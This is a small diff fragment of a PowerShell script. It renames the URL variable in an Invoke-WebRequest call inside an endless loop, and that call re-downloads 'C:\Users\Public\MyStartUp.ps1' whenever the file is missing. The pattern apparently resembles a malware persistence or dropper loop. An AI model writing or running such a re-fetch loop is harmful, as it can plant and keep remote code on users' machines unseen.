@@ -35,7 +35,7 @@ while ($true) {
 
     if (-not (Test-Path "C:\Users\Public\MyStartUp.ps1")) {
     Start-Sleep 5
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
+    Invoke-WebRequest -Uri $down -OutFile $filePath
     }
     
     Start-Sleep 8.8
